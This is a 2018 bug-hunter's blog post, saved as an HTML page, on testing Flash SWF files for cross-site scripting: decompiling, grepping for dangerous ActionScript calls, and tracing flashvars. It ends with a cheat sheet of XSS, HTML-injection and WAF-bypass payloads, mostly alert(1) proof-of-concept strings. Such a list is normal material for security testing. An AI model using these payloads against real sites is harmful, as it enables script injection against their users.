@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Gwendal Le Coguic">
+    <meta name="description" content="Gwendal Le Coguic, developer, bug hunter, independent cybersecurity expert">
+    <meta name="keywords" content="developer,security,researcher,pentester,bugbounty,tools,bash,php,python,golang">
+
+    <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://glc.st/images/swf-testing-xss.png"/>
+
+<meta name="twitter:title" content="Find vulnerabilities in Flash SWF"/>
+<meta name="twitter:description" content="As a user I would say that I don&rsquo;t care about all these Flash stuff that try to catch my eyes, most of the time I have a plugin to disable them.
+As a developper, it reminds me the (not so good) old time when the marketing peoples always wanted to add &ldquo;movement&rdquo; in the website, yeah it looks so kool!
+As a hacker, well&hellip; I didn&rsquo;t know how nice it could be, but I recently learned how to find issue in there and it&rsquo;s funny as hell.
+I was close to the success as I quickly found 3 XSS, but unfortunately all my reports were marked as duplicate :/"/>
+<meta name="twitter:site" content="@Gwendal Le Coguic"/>
+<meta name="twitter:creator" content="@gwendallecoguic"/>
+
+    <meta property="og:title" content="Find vulnerabilities in Flash SWF" />
+<meta property="og:description" content="As a user I would say that I don&rsquo;t care about all these Flash stuff that try to catch my eyes, most of the time I have a plugin to disable them.
+As a developper, it reminds me the (not so good) old time when the marketing peoples always wanted to add &ldquo;movement&rdquo; in the website, yeah it looks so kool!
+As a hacker, well&hellip; I didn&rsquo;t know how nice it could be, but I recently learned how to find issue in there and it&rsquo;s funny as hell.
+I was close to the success as I quickly found 3 XSS, but unfortunately all my reports were marked as duplicate :/" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://glc.st/posts/find-vulnerabilities-in-flash-swf/" />
+
+<meta property="og:image" content="https://glc.st/images/swf-testing-xss.png" />
+<meta property="article:published_time" content="2018-05-17T00:00:00+00:00" />
+<meta property="article:modified_time" content="2018-05-17T00:00:00+00:00" /><meta property="og:site_name" content="Gwendal Le Coguic" />
+
+
+    
+      <base href="https://glc.st/posts/find-vulnerabilities-in-flash-swf/">
+    
+    <title>
+    Find vulnerabilities in Flash SWF · Gwendal Le Coguic
+</title>
+
+    
+      <link rel="canonical" href="https://glc.st/posts/find-vulnerabilities-in-flash-swf/">
+    
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.1/css/all.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
+
+    
+      
+      
+      <link rel="stylesheet" href="https://glc.st/assets/css/coder.min.3d8325016df2bf0f0e874e28c83131f668a953cb3245cf9391fae4ff5b76b2ed.css" integrity="sha256-PYMlAW3yvw8Oh04oyDEx9mipU8syRc&#43;Tkfrk/1t2su0=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+      <link rel="stylesheet" href="https://glc.st/assets/css/custom.css" />
+    
+
+    <link rel="icon" type="image/png" href="https://glc.st/assets/img/favicon-256x256.png" sizes="256x256">
+    <link rel="icon" type="image/png" href="https://glc.st/assets/img/favicon-128x128.png" sizes="128x128">
+    <link rel="icon" type="image/png" href="https://glc.st/assets/img/favicon-64x64.png" sizes="64x64">
+    <link rel="icon" type="image/png" href="https://glc.st/assets/img/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://glc.st/assets/img/favicon-16x16.png" sizes="16x16">
+
+    <meta name="generator" content="Hugo 0.125.7">
+  </head>
+
+  <body class=" ">
+        <main class="wrapper">
+      <nav class="navigation d-print-none">
+  <section class="container">
+    <a class="navigation-title" href="https://glc.st/">
+      Gwendal Le Coguic
+    </a>
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://glc.st/posts/">Posts</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://glc.st/projects/">Projects</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://glc.st/cves/">CVEs</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://glc.st/services/">Services</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://glc.st/press/">Press</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://glc.st/about/">About</a>
+          </li>
+        
+      
+      
+    </ul>
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+<section class="container post">
+    <div id="sharer">
+    <div class="sharer-buttons">
+
+        <a href="https://twitter.com/intent/tweet?text=Find%20vulnerabilities%20in%20Flash%20SWF%20https%3a%2f%2fglc.st%2fposts%2ffind-vulnerabilities-in-flash-swf%2f" target="_blank"><img class="twitter" src="https://glc.st/assets/img/share/twitter.svg" alt="twitter"></a>
+        <a href="http://www.reddit.com/submit?url=https%3a%2f%2fglc.st%2fposts%2ffind-vulnerabilities-in-flash-swf%2f&title=Find%20vulnerabilities%20in%20Flash%20SWF" target="_blank"><img class="reddit" src="https://glc.st/assets/img/share/reddit.svg" alt="reddit"></a>
+        <a href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fglc.st%2fposts%2ffind-vulnerabilities-in-flash-swf%2f&amp;t=Find%20vulnerabilities%20in%20Flash%20SWF" target="_blank"><img class="hackernews" src="https://glc.st/assets/img/share/hackernews.svg" alt="hackernews"></a>
+        <a href="mailto:?subject=Find%20vulnerabilities%20in%20Flash%20SWF&body=https%3a%2f%2fglc.st%2fposts%2ffind-vulnerabilities-in-flash-swf%2f" target="_blank"><img class="mail" src="https://glc.st/assets/img/share/mail.svg" alt="mail"></a>
+        <a href="https://wa.me/?text=Find%20vulnerabilities%20in%20Flash%20SWF%20https%3a%2f%2fglc.st%2fposts%2ffind-vulnerabilities-in-flash-swf%2f" target="_blank"><img class="whatsapp" src="https://glc.st/assets/img/share/whatsapp.svg" alt="facebook"></a>
+        <a href="https://t.me/share/url?url=https%3a%2f%2fglc.st%2fposts%2ffind-vulnerabilities-in-flash-swf%2f&text=Find%20vulnerabilities%20in%20Flash%20SWF" target="_blank"><img class="telegram" src="https://glc.st/assets/img/share/telegram.svg" alt="facebook"></a>
+        <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fglc.st%2fposts%2ffind-vulnerabilities-in-flash-swf%2f&amp;title=Find%20vulnerabilities%20in%20Flash%20SWF" target="_blank"><img class="linkedin" src="https://glc.st/assets/img/share/linkedin.svg" alt="linkedin"></a>
+        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fglc.st%2fposts%2ffind-vulnerabilities-in-flash-swf%2f&t=Find%20vulnerabilities%20in%20Flash%20SWF" target="_blank"><img class="facebook" src="https://glc.st/assets/img/share/facebook.svg" alt="facebook"></a>
+
+        
+    </div>
+</div>
+
+
+    <article>
+        <header>
+            <div class="post-title">
+                <h1 class="title">Find vulnerabilities in Flash SWF</h1>
+            </div>
+            <div class="post-meta">
+                <div class="date">
+                    <span class="posted-on">
+                        <i class="fas fa-calendar"></i>
+                        <time datetime='2018-05-17T00:00:00Z'>
+                            May 17, 2018
+                        </time>
+                    </span>
+                    <span class="reading-time">
+                        <i class="fas fa-clock"></i>
+                        4 minutes read
+                    </span>
+                </div>
+                
+                <div class="tags">
+  <i class="fas fa-tag"></i>
+    <a href="https://glc.st/tags/flash/">flash</a>
+      <span class="separator">•</span>
+    <a href="https://glc.st/tags/xss/">xss</a></div>
+
+            </div>
+        </header>
+
+        <div>
+            <p>As a user I would say that I don&rsquo;t care about all these Flash stuff that try to catch my eyes, most of the time I have a plugin to disable them.
+As a developper, it reminds me the (not so good) old time when the marketing peoples always wanted to add &ldquo;movement&rdquo; in the website, yeah it looks so kool!
+As a hacker, well&hellip; I didn&rsquo;t know how nice it could be, but I recently learned how to find issue in there and it&rsquo;s funny as hell.
+I was close to the success as I quickly found 3 XSS, but unfortunately all my reports were marked as duplicate :/</p>
+<p>Below my reminder based on several articles I found here and there. For more details, I linked some of them at the very bottom of this page.</p>
+<h2 id="tools">Tools</h2>
+<p><a href="https://www.free-decompiler.com/flash/">JPEXS Free Flash Decompiler</a> to decompile the SWF files, read the code source and fully export it.<br>
+<a href="https://www.adobe.com/support/flashplayer/debug_downloads.html">Flash Player Projector content</a> standalone flash player I configured in JPEXS.<br>
+<a href="https://www.adobe.com/support/flashplayer/debug_downloads.html">Flash Player Projector content debugger</a> debug version of the standalone flash player I configured in JPEXS.<br>
+<a href="https://www.adobe.com/support/flashplayer/debug_downloads.html">Flash Player Plugin content debugger</a> to enable the debug mode of the flash plugin of the browser.<br>
+<a href="https://glc.st/assets/testflash.txt">testflash.php</a> a quick page I wrote to perform local tests.</p>
+<p>Using the debug version of the flash player (standalone or browser) and with the help of the <a href="https://help.adobe.com/en_US/flex/using/WS2db454920e96a9e51e63e3d11c0bf69084-7fc9.html">MacroMedia config file</a>, the flash log is enabled and will contain the trace setted by the developper:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ cat ~/mm.cfg
+</span></span><span style="display:flex;"><span>ErrorReportingEnable=1
+</span></span><span style="display:flex;"><span>TraceOutputFileEnable=1
+</span></span><span style="display:flex;"><span>MaxWarnings=50
+</span></span><span style="display:flex;"><span>AS3Trace=1
+</span></span></code></pre></div><h2 id="get-the-code">Get the code</h2>
+<p>1/ Download the SWF:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wget &lt;url&gt;
+</span></span></code></pre></div><p>2/ Open SWF file with JPEXS Free Flash Decompiler</p>
+<p>3/ Select all:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ctrl+a
+</span></span></code></pre></div><p>4/ Export:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>right click <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">export</span> selection
+</span></span></code></pre></div><p>5/ Remove duplicate files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>find <span style="color:#f92672">&lt;</span>export_dir<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>type f <span style="color:#f92672">-</span>name <span style="color:#e6db74">&#34;*_[0123456789]*&#34;</span> <span style="color:#f92672">-</span>exec rm {} \;
+</span></span></code></pre></div><p><img src="https://glc.st/images/swf-testing-jpexs.png" alt="SWF testing JPEXS"></p>
+<h2 id="extract-datas">Extract datas</h2>
+<p>Find comments:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>extract<span style="color:#f92672">-</span>endpoints <span style="color:#f92672">-</span>d <span style="color:#f92672">&lt;</span>export_dir<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>n <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">-</span>r <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#34;*&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span>c
+</span></span></code></pre></div><p>Find hash or interesting keywords:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>extract<span style="color:#f92672">-</span>endpoints <span style="color:#f92672">-</span>d <span style="color:#f92672">&lt;</span>export_dir<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>n <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">-</span>r <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#34;*&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span>k
+</span></span></code></pre></div><p>Find endpoints:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>extract<span style="color:#f92672">-</span>endpoints <span style="color:#f92672">-</span>d <span style="color:#f92672">&lt;</span>export_dir<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>n <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">-</span>r <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#34;*&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Find almost everything that could be interesting with <code>flash-regexp.sh</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>target_dir<span style="color:#f92672">=</span>$1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&#34;flash-regexp.txt&#34;</span> | <span style="color:#66d9ef">while</span> read -r r; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>	echo <span style="color:#e6db74">&#34;</span>$r<span style="color:#e6db74">&#34;</span> | awk -F <span style="color:#e6db74">&#34;;;&#34;</span> <span style="color:#e6db74">&#39;{print $1&#34; : &#34;$2}&#39;</span>
+</span></span><span style="display:flex;"><span>	reg<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>echo <span style="color:#e6db74">&#34;</span>$r<span style="color:#e6db74">&#34;</span> | awk -F <span style="color:#e6db74">&#34;;;&#34;</span> <span style="color:#e6db74">&#39;{print $3}&#39;</span><span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>	escape_reg<span style="color:#f92672">=</span>$reg
+</span></span><span style="display:flex;"><span>	escape_reg<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $escape_reg | sed <span style="color:#e6db74">&#34;s/\&#34;/\\\\\&#34;/g&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>	echo $escape_reg
+</span></span><span style="display:flex;"><span>	egrep --color -ri <span style="color:#e6db74">&#34;</span>$escape_reg<span style="color:#e6db74">&#34;</span> $target_dir
+</span></span><span style="display:flex;"><span>	echo
+</span></span><span style="display:flex;"><span>	echo
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>Which is basically a multitude of grep based on a list I found <a href="http://www.bishopfox.com/dictionaries/Flash%20Regexes.txt">there</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Flash XSS (HIGH);;clicktag XSS;;geturl\(.*clicktag.*\)
+</span></span><span style="display:flex;"><span>Flash XSS (HIGH);;getURL XSS;;geturl\(.*(_root\.|_level0\.|_global\.).*\)
+</span></span><span style="display:flex;"><span>Flash XSS (HIGH);;getURL XSS;;geturl\([^&#39;&#34;.]*\)
+</span></span><span style="display:flex;"><span>Flash XSS (HIGH);;navigateToURL XSS;;navigateToURL\([^&#39;&#34;.]*\)
+</span></span><span style="display:flex;"><span>Flash XSS (HIGH);;ExternalInterface.call XSS;;ExternalInterface\.call\(.*(_root\.|_level0\.|_global\.).*\)
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p><img src="https://glc.st/images/swf-testing-extract-datas.png" alt="SWF testing extract datas"></p>
+<h2 id="manual-analysis">Manual analysis</h2>
+<p>Enable and check the Flash log:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cd /usr/lib/adobe-flashplugin
+</span></span><span style="display:flex;"><span>cp libflashplayer_debug.so libflashplayer.so
+</span></span><span style="display:flex;"><span>tail -f ~/.macromedia/Flash_Player/Logs/flashlog.txt | grep -a -v AVMINF
+</span></span></code></pre></div><p>Locally run the SWF file with all parameters in the test page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>firefox http://127.0.0.1/testflash/testflash.php?__swf=&lt;MYSWF_FILE&gt;.swf&amp;param1=value1&amp;param2=value2...
+</span></span></code></pre></div><p>Find parameters in JPEXS and track them one by one from the initialization to the final use:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>ctrl<span style="color:#f92672">+</span>shift<span style="color:#f92672">+</span>F <span style="color:#f92672">+</span> Ignore <span style="color:#66d9ef">case</span> <span style="color:#f92672">-&gt;</span> flashvars
+</span></span></code></pre></div><p>Find dangerous methods in JPEXS and reverse track the parameters:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ctrl+shift+F + Ignore case -&gt; geturl
+</span></span></code></pre></div><p><img src="https://glc.st/images/swf-testing-flash-log.jpg" alt="SWF testing flash log"></p>
+<h2 id="take-care-of">Take care of</h2>
+<p>Unsafe methods in Actionscript:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>loadVariables()
+</span></span><span style="display:flex;"><span>getURL()
+</span></span><span style="display:flex;"><span>getURLBlankVar()
+</span></span><span style="display:flex;"><span>getURLParentVar()
+</span></span><span style="display:flex;"><span>getURLJSParam()
+</span></span><span style="display:flex;"><span>loadMovie()
+</span></span><span style="display:flex;"><span>loadMovieVar()
+</span></span><span style="display:flex;"><span>loadMovieNum()
+</span></span><span style="display:flex;"><span>FScrollPane<span style="color:#f92672">.</span>loadScrollContent()
+</span></span><span style="display:flex;"><span>LoadVars<span style="color:#f92672">.</span>load 
+</span></span><span style="display:flex;"><span>LoadVars<span style="color:#f92672">.</span>send 
+</span></span><span style="display:flex;"><span>XML<span style="color:#f92672">.</span>load ( <span style="color:#e6db74">&#39;url&#39;</span> )
+</span></span><span style="display:flex;"><span>XML<span style="color:#f92672">.</span>sendAndLoad ( <span style="color:#e6db74">&#39;url&#39;</span> )
+</span></span><span style="display:flex;"><span>LoadVars<span style="color:#f92672">.</span>load ( <span style="color:#e6db74">&#39;url&#39;</span> )
+</span></span><span style="display:flex;"><span>LoadVars<span style="color:#f92672">.</span>send ( <span style="color:#e6db74">&#39;url&#39;</span> ) 
+</span></span><span style="display:flex;"><span>Sound<span style="color:#f92672">.</span>loadSound( <span style="color:#e6db74">&#39;url&#39;</span> , isStreaming );
+</span></span><span style="display:flex;"><span>NetStream<span style="color:#f92672">.</span>play( <span style="color:#e6db74">&#39;url&#39;</span> );
+</span></span><span style="display:flex;"><span>flash<span style="color:#f92672">.</span>external<span style="color:#f92672">.</span>ExternalInterface<span style="color:#f92672">.</span>call(_root<span style="color:#f92672">.</span>callback)
+</span></span><span style="display:flex;"><span>externalInterface<span style="color:#f92672">.</span>addCallback
+</span></span><span style="display:flex;"><span>htmlText
+</span></span><span style="display:flex;"><span>htmlVar
+</span></span><span style="display:flex;"><span>loadClip
+</span></span><span style="display:flex;"><span>AddDLL
+</span></span></code></pre></div><p>Functions that can load objects, or send/receive/store data:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>XMLLoader, AMFService, SWFLoader, loadVariables, loadMovie,
+</span></span><span style="display:flex;"><span>loadMovieNum, LoadVars<span style="color:#f92672">.</span>load, LoadVars<span style="color:#f92672">.</span>send, NetStream<span style="color:#f92672">.</span>play,
+</span></span><span style="display:flex;"><span>getDefinition, getDefinition, FScrollPane<span style="color:#f92672">.</span>loadScrollContent, XML<span style="color:#f92672">.</span>load,
+</span></span><span style="display:flex;"><span>Sound<span style="color:#f92672">.</span>loadSound, NetStream<span style="color:#f92672">.</span>play, URLRequest, URLLoader,
+</span></span><span style="display:flex;"><span>URLStream, LocalConnection, SharedObject
+</span></span></code></pre></div><p>Uninitialized global vars (ActionScript 2):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>_root
+</span></span><span style="display:flex;"><span>_global
+</span></span><span style="display:flex;"><span>_level0
+</span></span></code></pre></div><p>Uninitialized global vars (ActionScript 3):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>loaderInfo
+</span></span><span style="display:flex;"><span>parameters
+</span></span></code></pre></div><h2 id="xss-payloads">XSS payloads</h2>
+<p>AS2 getURL() / AS3 NavigateToURL():</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>javascript:alert(1)
+</span></span><span style="display:flex;"><span>javascript://adobe.com%0aalert(1)
+</span></span><span style="display:flex;"><span>data:text/html,&lt;script&gt;alert(1)&lt;script&gt;
+</span></span><span style="display:flex;"><span>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+</span></span></code></pre></div><p>AS2 fscommand, AS2 .watch, AS3 externalInterface.Call (like PHP preg_replace/e issue):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>alert`0`
+</span></span><span style="display:flex;"><span>%#jsinitfunctio%gn=alert%601%60
+</span></span><span style="display:flex;"><span>\&#34;))-alert(1)}catch(e){}//
+</span></span><span style="display:flex;"><span>\&#34;))} catch(e) {alert(1);}//
+</span></span><span style="display:flex;"><span>\&#39;);alert(document.domain);
+</span></span><span style="display:flex;"><span>\&#34;));throw_error()}catch(e){alert(document.domain))}//
+</span></span><span style="display:flex;"><span>\&#34;);function%20someFunction(a){}prompt(1)//
+</span></span><span style="display:flex;"><span>&#34;%5D);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
+</span></span><span style="display:flex;"><span>flash.external.ExternalInterface.call(&#34;alert&#34;, &#39;1&#39;);
+</span></span></code></pre></div><p>HTML injection:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;img src=&#39;javascript:alert(1)//.swf&#39;&gt;
+</span></span><span style="display:flex;"><span>&lt;a href=asfunction:System.Security.allowDomain,www.example.com&gt;
+</span></span><span style="display:flex;"><span>&lt;a href=asfunction:getURL,javascript:alert(1)&gt;
+</span></span></code></pre></div><p>WAF bypass:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>param1=value1
+</span></span><span style="display:flex;"><span>pa%Xram1=val%Yue1
+</span></span><span style="display:flex;"><span>pa%=ram1=val%#ue1
+</span></span><span style="display:flex;"><span>pa%AXram1=val%B#ue1
+</span></span><span style="display:flex;"><span>File.swf?%#param1=value1&amp;p2=v2
+</span></span><span style="display:flex;"><span>%#jsinitfunctio%gn=alert%601%60
+</span></span></code></pre></div><p>Trigger Error:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>xxx&#34;&#39;(){}\&#34;\&#39;(){}\\&#39;\\&#34;(){}xxx
+</span></span></code></pre></div><h2 id="other-tools">Other tools</h2>
+<p><a href="https://www.adobe.com/devnet/flex/flex-sdk-download.html">Adobe Flex SDK</a> to compile Actionscript (mxmlc).<br>
+<a href="https://github.com/irsdl/updated-SWFIntruder">SWFIntruder</a> to test XSS.<br>
+<a href="https://cure53.de/flashbang">Flashbang</a> to find FlashVars.</p>
+<h2 id="external-resources">External resources</h2>
+<ul>
+<li><a href="https://ret2libc.wordpress.com/2016/04/04/analysing-swf-files-for-vulnerabilities/">Analysing SWF files for vulnerabilities by MLT</a></li>
+<li><a href="http://media.wix.com/ugd/533dd4_c096c1fa67814318acb84d41a04fb258.pdf">Flash it baby! by IRSDL</a></li>
+<li><a href="https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/">Finding XSS vulnerabilities in flash files by Smiegles</a></li>
+<li><a href="https://www.adobe.com/devnet/adobe-media-server/articles/cross-domain-xml-for-streaming.html">Setting a crossdomain.xml file for HTTP streaming</a></li>
+</ul>
+        </div>
+
+        <footer>
+            
+
+
+        </footer>
+    </article>
+
+    
+</section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    
+    
+    
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+  
+    
+      
+    
+  
+
+
+
+    
+      <script src="https://glc.st/assets/js/scripts.js"></script>
+    
+
+  </body>
+
+</html>
